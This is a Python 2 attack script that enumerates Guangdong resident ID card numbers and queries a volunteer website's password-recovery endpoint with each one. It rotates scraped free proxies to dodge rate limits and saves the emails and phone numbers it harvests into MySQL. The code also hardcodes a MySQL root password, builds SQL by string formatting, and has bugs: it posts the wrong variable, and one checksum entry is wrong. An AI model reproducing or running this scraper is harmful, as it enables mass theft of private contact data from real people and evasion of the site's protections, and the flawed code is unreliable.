#-*- coding:utf-8 -*-
#dev: python2.7
import requests
import MySQLdb
import re
import datetime
import time
from scrapy.selector import Selector
import threading
import Queue
import sys
import random
reload(sys)
sys.setdefaultencoding('utf-8')


class XiciDaiLiSpider(object):
    def __init__(self, page = 2):
        self.urls = ['http://www.xicidaili.com/nn/%s' % n for n in range(1, page)]
        self.headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'en-US,en;q=0.5',
            'Cache-Control': 'max-age=0',
            'Connection': 'keep-alive',
            'Host': 'www.xicidaili.com',
            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 6_1_2 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10B146 Safari/8536.25',
        }


    def run(self):
        for u in self.urls:
            rep = requests.get(u, headers = self.headers)
            #print rep.content
            sel =Selector(text = rep.content)
            infos = sel.xpath('//tr[@class="odd"]').extract()
            for info in infos:
                val = Selector(text = info)
                ip = val.xpath('//td[2]/text()').extract_first()
                port = val.xpath('//td[3]/text()').extract_first()
                country = val.xpath('//td[4]/a/text()').extract_first()
                anonymity = val.xpath('//td[5]/text()').extract_first()
                yield ( ip, port, country, anonymity)


class Mysql_helper(object):
    def __init__(self):
        self.db = MySQLdb.connect("127.0.0.1", "root", "mysqlroot", "ip_proxy",charset='utf8')
        self.db2 = MySQLdb.connect("127.0.0.1","root","mysqlroot","izhiyuan" ,charset='utf8')

        
    def reconection(self):
        self.db = MySQLdb.connect("127.0.0.1", "root", "mysqlroot", "ip_proxy",charset='utf8')
        self.db2 = MySQLdb.connect("127.0.0.1","root","mysqlroot","izhiyuan" ,charset='utf8')

    def insert_db(self, daili):
        db = MySQLdb.connect("127.0.0.1", "root", "mysqlroot", "ip_proxy",charset='utf8')
        cursor = db.cursor()
        sql = "insert into info( ip, port, country, anonymity) values(%s, %s, %s, %s)"
        print '+++++++++++++++++++++++++++'
        for tup in daili.run():
            #print tup[0]
            try:
                cursor.execute(sql, tup)
                db.commit()
            except Exception, e:
                print e
                db.rollback()
        cursor.close()
        db.close()
        
    def query_db(self):
        db = MySQLdb.connect("127.0.0.1", "root", "mysqlroot", "ip_proxy",charset='utf8')
        cur =db.cursor()
        sql = 'select * from info'
        cur.execute(sql)
        result = cur.fetchall()
        cur.close()
        db.close()
        if result:
            return result[random.randint(0,20)]
        else:
            return 

    def delet_db(self):
        db = MySQLdb.connect("127.0.0.1", "root", "mysqlroot", "ip_proxy",charset='utf8')
        cursor = db.cursor()
        sql = 'truncate info'
        cursor.execute(sql)
        cursor.close()

    
    def insert_idc(self, idc, data):
        if len(data) == 2:
            sql='insert into info(id_card,info_email, info_1_phone) values({0}, {1}, {2})'.format(idc, data[0][0], data[1][1])
        elif len(data) == 1:
            sql='insert into info(id_card,info_1_phone) values(\'{0}\', {1})'.format(idc, data[0][1])
        else:
            #print 'pass ..............%s'%idc
            return
        db2 = MySQLdb.connect("127.0.0.1","root","mysqlroot","izhiyuan" ,charset='utf8')
        cursor = db2.cursor()
        try:
            print sql
            cursor.execute(sql)
            db2.commit()
            cursor.close()
            print 'save success'
        except Exception, e:
            print e
            db2.rollback()
        db2.close()
        
    def cleose_db(self):
        self.db.close()
        self.db2.close()

class Get_data(object):
    def __init__(self, daili):
        #self.url = 'http://wxcs.gdzyz.cn/user/userLogin/backPasswordUserInfo.do'
        self.url = 'http://120.25.130.144/user/userLogin/backPasswordUserInfo.do'
        self.headers = {
            'Host':'wxcs.gdzyz.cn',
            'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
            'X-Requested-With': 'XMLHttpRequest',
            }
        self.count = 0
        self.daili = daili

        
    def set_proxy(self,mdb):
        proxies = mdb.query_db()
        #print proxies
        if proxies:
            self.proxies = {
          'http':'http://{0}:{1}'.format(proxies[0],proxies[1])
        }
        else:
            self.proxies = {}
        #print self.proxies


    def req_post(self,idc,mdb):
        payload = 'loginName={0}'.format(id)
        try:
            #print 'posting................'
            req = requests.post(self.url, proxies = self.proxies, headers = self.headers, data = payload,timeout=1)
            return req.content

        except Exception, e:
            print e
            if self.count < 100:
                self.set_proxy(mdb)
                self.req_post(idc, mdb)
                self.count += 1
            else:
                mdb.delet_db()
                mdb.insert_db(self.daili)
                self.set_proxy(mdb)
                self.req_post(idc, mdb)
                self.count = 0


class Get_idc(object):
    def __init__(self):
        self.id_tuple = (  440232, 440233, 440281,
        440282, 440300, 440301, 440303, 440304, 440305, 440306, 440307, 440308,
        440400, 440401, 440402,  440403, 440404, 440500, 440501, 440507, 440511,
        440512, 440513, 440514, 440515, 440523, 440600, 440601, 440604, 440605,
        440606, 440607, 440608, 440700, 440701, 440703, 440704, 440705, 440781,
        440783, 440784, 440785, 440800, 440801, 440802, 440803, 440804, 440811,
        440823, 440825, 440881, 440882, 440883, 440900, 440901, 440902, 440903,
        440923, 440981, 440982, 440983, 441200, 441201, 441202, 441203, 441223,
        441224, 441225, 441226, 441283, 441284, 441300, 441301, 441302, 441303,
        441322, 441323, 441324, 441400, 441401, 441402, 441521, 441523, 441581,
        441600, 441601, 441602, 441621, 441622, 441623, 441624, 441625, 441700,
        441421, 441422, 441423, 441424, 441426, 441427, 441481, 441500, 441501,
        441502, 441701, '441702', '441721', '441723', '441781', '441800', 
        '441801', '441802', '441821', '441823', '441825', '441826', '441827', 
        '441881', '441882', '441900', '442000', '445100', '445101', '445102', 
        '445121', '445122', '445200', '445201', '445202', '445221', '445222', 
        '445224', '445281', '445300', '445301', '445302', '445321', '445322', 
        '445323', '445381',
        )
        

    def gen_id(self):
        for id_code in self.id_tuple:
            #print id_code
            for day in range(0,365):
                d = datetime.date.today() + datetime.timedelta(day)
                for year in xrange(1990,1999):
                    id_birth = str(year) + d.strftime('%m%d')
                    #print id_birth
                    #sxm = random.randint(0,999)
                    for sxm in xrange(0,999):
                        if  100<= sxm <= 999:
                            id_sxm = str(sxm)
                        elif   10<=sxm<=99:
                            id_sxm = '0' + str(sxm)
                        else:
                            id_sxm = '00' + str(sxm)
                        #print id_sxm
                        id = str(id_code) + id_birth + id_sxm
                        weight = [7, 9, 10, 5, 8, 4, 2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2]
                        checkcode ={0:'1',1:'0',2:'X',3:'9', 4:'8', 5:'7', 6:'6', 7:'5', 8:'5', 9:'3', 10:'2'}
                        count = 0
                        for j,id_iterable in enumerate(id):
                            count = count + int(id_iterable)*weight[j]
                        id_check = checkcode[(count % 11)]
                        id_card = str(id_code) + id_birth + id_sxm + id_check
                        yield id_card
        
        


class Gen_Thread(object):
    def __init__(self, idc, q, get_data, mdb, daili):
        self.idc = idc
        self.q = q
        self.get_data = get_data
        self.mdb = mdb
        self.daili = daili

    def run(self):
        self.mdb.insert_db(self.daili)
        self.get_data.set_proxy(self.mdb)
        threads = []
        for id in self.idc.gen_id():
            
            if not self.q.full():
                #print 'puting........'
                self.q.put(id)
                c_t = Crawl_Thread(self.q, self.get_data, self.mdb)
                threads.append(c_t)
            else:
                #print self.q.qsize()
                for t in threads:
                    #print 'starting thread %s'%t
                    t.start()
                for t in threads:
                    #print 'waiting .. %s'%t
                    t.join()
                threads = []
            #self.mdb.delet_db()


def Tools(data):
    pattern = re.compile(r'\[|\]|,')
    items = re.sub(pattern, '', data)
    patterns = re.compile(r'("\d+@.+\.com")|"(\d+)"')
    items = re.findall(patterns, items)
    #print items
    return items
            
class Crawl_Thread(threading.Thread):
    def __init__(self, q, get_data, mdb):
        super(Crawl_Thread, self).__init__()
        self.q = q
        self.get_data = get_data
        self.mdb = mdb

    def run(self):
        idc = self.q.get()
        #print 'got idc %s' %idc
        data = self.get_data.req_post(idc, self.mdb)
        items = Tools(data)
        self.mdb.insert_idc(idc, items)
        


class main(object):
    def __init__(self):
        daili = XiciDaiLiSpider()
        mdb = Mysql_helper()
        idc = Get_idc()
        get_data = Get_data(daili)
        q = Queue.Queue(20)
        self.gen = Gen_Thread(idc, q, get_data, mdb, daili)


    def thread_start(self):
        self.gen.run()


if __name__ == '__main__':
    main().thread_start()
